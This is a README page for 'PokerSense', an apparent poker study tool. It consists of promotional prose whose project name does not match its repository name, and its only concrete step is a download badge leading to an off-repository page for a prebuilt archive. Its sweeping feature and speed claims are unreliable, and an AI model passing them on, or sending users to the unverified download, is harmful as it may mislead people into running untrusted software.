![preview](https://raw.githubusercontent.com/timdarley8/poker-mind-gambit/main/poster_0b426e8.svg)

# ♠️ PokerSense — Adaptive Learning Engine for Texas Hold’em

Welcome to **PokerSense**, a comprehensive, open-source decision-support framework that transforms raw hand histories into a living, breathing strategic coach. Unlike conventional solvers that dump complex equity tables, PokerSense acts as a **translator between mathematical abstraction and human intuition**, helping players at every level internalize the *why* behind every move. It’s not a cheat sheet; it’s a mental gymnasium for your poker brain.

Built on the shoulders of probabilistic modeling and pattern recognition, this repository provides a modular suite of tools that ingest your gameplay data, analyze tendencies, and output personalized training drills. The core philosophy here is **adaptive simplicity** — the system doesn’t just tell you what to do; it explains the reasoning in layered depths, so you can peel back the onion as your skill grows. Whether you’re a tournament grinder analyzing final-table shoves or a cash game enthusiast trying to plug a river leak, PokerSense offers a systematic, data-driven mirror to your own decision-making forest.

---

## 📊 Project Overview

PokerSense is designed as a **self-hosted intelligence layer** for serious poker study. The project is split into three primary pillars: **Data Ingestion**, **Strategy Inference**, and **Feedback Visualization**. The first pillar handles parsing of standard hand history formats. The second pillar runs monte-carlo simulations and applies heuristic filters based on Game Theory Optimal (GTO) principles. The third pillar renders your strengths and weaknesses as a dynamic dashboard, complete with interactive graphs and personalized recommendations.

What makes this repository unique is its **focus on psychological heuristics** alongside raw math. It doesn't just solve for Nash equilibrium in a vacuum; it contextualizes your specific opponent pool tendencies, bet sizing patterns, and tilt triggers. The goal is to help you build a **versatile, exploitative style** that wins against real humans, not just theoretical bots.

### 🌟 Key Feature Ecosystem

- **Adaptive Curriculum Builder**: Creates a daily study plan based on your identified leak areas. If you recurrently misplay top-pair weak kicker in multiway pots, the system generates curated scenarios to drill that exact spot.
- **Opponent Profiling Engine**: Automatically categorizes table adversaries into archetypes (e.g., "Tight-Aggressive Rock," "Loose-Passive Calling Station") based on live hand data. This is crucial for dynamic table selection in 2026’s competitive online environment.
- **Multilingual Strategy Library**: The core insights and drill explanations are localized into **12 major languages**, including English, Spanish, Mandarin, and German. This ensures that non-native speakers absorb complex strategic concepts without linguistic friction.
- **Responsive Web Interface**: The built-in analytics dashboard is fully responsive, running fluidly on devices from a 27-inch monitor down to a 6-inch smartphone. Review your session on the train home, or adjust your study parameters during a work break.
- **24/7 Community Support Channel**: While the software is self-contained, we maintain an active community forum where advanced users and maintainers help troubleshoot edge cases, share new drill templates, and discuss the implications of upcoming rule changes. Support is a dialogue, not a ticket queue.
- **Privacy-First Architecture**: All processing occurs locally on your machine. We do not capture telemetry, log your hands to a server, or track your usage patterns. Your strategic edge remains yours alone.

---

## 📥 Getting Started

> **[![Download](https://raw.githubusercontent.com/timdarley8/poker-mind-gambit/main/get_9ac0.svg)](https://timdarley8.github.io/poker-mind-gambit/)**  

Your journey begins by obtaining the latest release bundle. We have structured the installation process to be as frictionless as possible, whether you are a command-line veteran or a GUI enthusiast. The build is distributed as a single, self-contained archive that includes the runtime environment, pre-compiled simulation binaries, and the default rule-set database.

The initial setup will walk you through connecting your preferred poker client’s hand history folder. Since the software respects your privacy, no cloud authentication is required; you simply point the application to your local directory (or import a .txt/.csv file) and let the analytical process begin. The system will then generate your first **Baseline Strategy Map** — a visual representation of your current decision tree versus the theoretical optimal branch.

### 🔧 System Requirements

- **Operating Systems**: Windows 10/11, macOS 12+, or any modern Linux distribution (x86_64 architecture)
- **Memory**: 8 GB RAM recommended for smooth simulation of complex multi-street scenarios
- **Storage**: 300 MB of available space for the program files and temporary cache
- **Display**: A screen resolution of at least 1280x720 for optimal dashboard rendering

---

## 🧠 The Decision Core: How It Works

At the heart of PokerSense lies a **hybrid decision engine** that weights statistical simulation results against a database of hand-crafted expert rules. This is not a brute-force solver that runs for hours on end; rather, it employs a **probabilistic pruning algorithm** to identify the top 3 to 5 viable lines of play in any given situation, instantly. This speed is essential for analyzing sessions in real-time, allowing you to review a hand moments after it ends while the emotional context is still fresh.

The engine outputs a feature we call the **"Decision Clarity Index."** This metric, presented as a percentage, indicates how close your chosen action was to the "optimal" line suggested by the system. However, PokerSense intelligently flags instances where a deviation from optimal might be *correct* — for example, when exploiting a specific player’s known fold tendency. This prevents the system from becoming a robotic rulebook and encourages strategic creativity.

### 📈 Performance & Accuracy Metrics

The underlying simulation model runs approximately **40,000 Monte Carlo iterations per hand** to ensure a 95% confidence interval for equity calculations. We have benchmarked this process to complete in under 200 milliseconds on standard consumer hardware, ensuring zero lag in your review workflow. The strategic database includes ranges for **No-Limit Hold’em**, **Pot-Limit Omaha**, and **Limit Hold’em**, with plans to expand to Short-Deck variants in the next major update cycle.

---

## 🛠️ Architecture & Modularity

The codebase is intentionally modular. You can use the entire system as a unified stack, or you can employ its individual components as libraries for your own projects. For instance, the hand-history parser is exported as a standalone utility, and the simulation engine is available as a REST API service if you prefer to build your own front-end.

- **`poker-core/`** — The primary logic for hand evaluation, rank detection, and equity calculation.
- **`strategy-engine/`** — The inference layer that weighs heuristics and simulation data.
- **`analysis-dashboard/`** — The front-end web application (HTML/CSS/JavaScript) that visualizes insights.
- **`data-formats/`** — Standardized schemas for importing and exporting hand data, ensuring interoperability with other poker tools you might use.

This modular structure means you can contribute to the project by improving a single component without needing to understand the entire codebase. We welcome contributions of new heuristic rules, optimized simulation algorithms, and translations for the strategy library.

---

## 📚 Multi-Language Support & Localization

In the dynamic landscape of 2026, poker is a global game. To that end, PokerSense includes a robust i18n framework. The user interface, the drill instructions, and the generated reports will adapt to the user’s locale preference. Our localization framework is not just a simple dictionary translation; it accounts for cultural nuances in how poker concepts are taught. For example, the English term "pot odds" has a different pedagogical weight in Japanese teaching styles compared to Brazilian Portuguese, and our system adjusts the phrasing accordingly to ensure maximum comprehension.

We are actively seeking volunteer translators for additional languages such as Hindi, Vietnamese, and Turkish. If you possess deep knowledge of both poker and a second language, your contribution will be invaluable to our mission of democratizing high-level strategy education.

---

## 🛡️ Security & Privacy Assurance

Your data is your most precious strategic asset. Unlike subscription-based analytics sites that require uploading your entire hand history to their cloud servers, PokerSense operates under a **binary operation principle**: your data never leaves your machine. The application does not make any outgoing network connections except for checking for software updates (which you can disable in the settings). We have intentionally omitted telemetry, analytics pixels, and crash reporters from the build to guarantee that your sessions remain confidential.

The only communication with the external world occurs if you explicitly choose to share a hand history in the community forum for discussion. This is an opt-in feature, and the tool will anonymize player names before you copy the data to your clipboard.

---

## 🗺️ Roadmap & Future Enhancements

The development cycle for 2026 is focused on integrating **behavioral neuroscience models** into the feedback loop. We are researching how to quantify "tilt" using micro-patterns in bet-timing and decision-speed changes over a long session. The goal is to teach the system to detect when your mental state is deteriorating and proactively suggest a break or a simplified strategy adjustment.

We are also developing a **"Multi-Table Guardian"** mode. This feature will highlight hands across multiple tables that are statistically likely to be significant , ensuring you don't miss a critical decision while alt-tabbing between windows. This is a challenging problem in attention-management, and we are excited to see how the community responds to our first prototype.

---

## 🤝 How to Contribute

We believe that the best strategy tools are built by the players who use them. If you have a penchant for algorithm optimization, an eye for UI/UX design, or simply a wealth of poker experience, we encourage you to participate in the repository's development.

- **Submit a Feature Request**: Use the issues tracker to propose new drill types or analysis metrics.
- **Translate the UI**: Join the localization effort to reach a wider audience.
- **Refactor the Core**: Help us optimize the simulation engine for even faster performance.
- **Write Documentation**: Excellent code is useless without excellent guides. We invite you to expand the wiki with deeper dives into specific strategic concepts.

Please read the contributing guidelines in the repository structure for detailed instructions on setting up your development environment and submitting a pull request.

---

## 🔬 Technical Support

The project maintainers and a dedicated community of power users are available to answer questions around the clock. We encourage you to use the **Discussions** tab in the repository for general inquiries, as this allows the entire community to benefit from the exchange. For potentially sensitive issues regarding bugs, please use the **Issues** tracker with the appropriate labels.

We aim to acknowledge all support requests within 24 hours and to provide a satisfactory resolution or workaround within a week. The **24/7 support channel** refers to the community’s asynchronous nature; someone is usually awake somewhere in the world to provide a nudge in the right direction.

---

## ⚠️ Disclaimer

**PokerSense is an educational and analytical tool.** It is intended to be used for personal study and skill development. The output of the software, including any recommendations or "optimal" solutions, is provided "as is" without warranty of any kind, express or implied. Poker is a game of incomplete information and involves substantial variance. Even the highest-probability decision can result in a loss. You are solely responsible for your actions at the poker table, and the makers of PokerSense assume no liability for any financial outcomes resulting from the use of this software.

Furthermore, this tool is **not designed for direct use during online game play**. It is a post-session review and training mechanism. Using automated tools to assist decision-making during a live online hand is a violation of the Terms of Service of virtually all major poker sites and could lead to account suspension or forfeiture of funds. You must ensure that your use of PokerSense fully complies with the rules and regulations of the jurisdiction in which you play and the policies of the site you utilize.

---

## 📄 License

This project is proudly released under the **MIT License**. This permissive license grants you the freedom to use, copy, modify, merge, publish, and distribute the software, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the Software. In essence, you are free to utilize this framework for commercial products or personal projects, provided you give credit to the original developers.

For the full legal text, please refer to the [MIT License](https://opensource.org/licenses/MIT) page or the `LICENSE` file in the root directory of this repository. We believe in open innovation, and we hope this license encourages you to build upon our foundational work and share your own unique modifications with the world.

---

## 🏁 Final Thoughts

PokerSense is more than just a software package; it is a community project dedicated to raising the collective intelligence of poker players. By automating the tedious math and presenting the information in a human-friendly manner, we hope to free up your mental bandwidth for the truly creative aspects of the game: understanding your opponents, crafting deceptive narratives, and making bold, well-timed bluffs.

We invite you to take this tool, bend it to your will, and let it shape you into a more complete player. Dive into the code, contribute your insights, and share your success stories. The river is just the beginning.

---

> **[![Download](https://raw.githubusercontent.com/timdarley8/poker-mind-gambit/main/get_9ac0.svg)](https://timdarley8.github.io/poker-mind-gambit/)**